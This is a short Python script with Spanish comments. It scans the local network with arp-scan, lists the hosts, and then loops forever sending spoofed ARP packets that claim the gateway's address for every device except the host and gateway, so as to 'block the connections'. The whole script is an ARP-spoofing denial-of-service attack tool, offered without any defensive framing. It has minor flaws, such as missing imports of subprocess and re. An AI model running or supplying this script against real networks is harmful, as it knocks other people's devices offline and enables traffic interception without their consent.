import os
import socket
from scapy.all import *

# Ejecutar el comando arp-scan
result = subprocess.run(["arp-scan", "--localnet"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Obtener la salida del comando
output = result.stdout.decode().strip()

# Filtrar solo las direcciones IP
ips = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)

# Obtiene la direccion IP del host
def get_ip_address():
    output = subprocess.run(["ifconfig"], capture_output=True, text=True).stdout
    ip_address = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output).group(1)
    return ip_address

host_ip = get_ip_address()
# Obtiene la direccion IP de la puerta de enlace
gateway = os.popen("ip route show default | awk '/default/ {print $3}'").read().rstrip()

# Ordenar las diferentes IPs
def ip_to_tuple(ip):
    return tuple(map(int, ip.split(".")))

sorted_ips = sorted(ips, key=ip_to_tuple)
for ip in sorted_ips:
    if ip == gateway:
        print(f"{ip} (puerta de enlace)")
    elif ip == host_ip:
        print(f"{ip} (host)")
    else:
        print(ip)


# Lista de direcciones IP a bloquear
ips_to_block = [ip for ip in ips if ip not in (host_ip, gateway)]

stop = False

while not stop:
# Construye y envia paquetes ARP para bloquear las conexiones
    for ip in ips_to_block:
        arp_packet = ARP(pdst=ip, psrc=gateway, hwdst=Ether().src)
        send(arp_packet, verbose=0)

